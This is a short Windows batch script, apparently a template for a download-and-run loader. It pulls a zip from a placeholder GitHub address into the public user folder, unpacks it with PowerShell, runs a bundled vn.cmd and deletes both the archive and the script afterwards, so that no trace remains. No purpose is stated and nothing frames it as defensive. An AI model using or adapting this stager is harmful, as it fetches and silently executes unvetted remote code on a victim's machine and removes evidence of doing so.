:: @echo off
cls
set URL=https://github.com/EDIT/EDIT/EDIT.zip
set ZIP_PATH=C:\Users\Public\myFile.zip
set DESTINATION_FOLDER=C:\Users\Public
curl -L -o "%ZIP_PATH%" "%URL%"
powershell -command "Expand-Archive -LiteralPath '%ZIP_PATH%' -DestinationPath '%DESTINATION_FOLDER%'"
del "%ZIP_PATH%"
call "%DESTINATION_FOLDER%\vn.cmd"
del "%DESTINATION_FOLDER%\vn.cmd"
:: exit
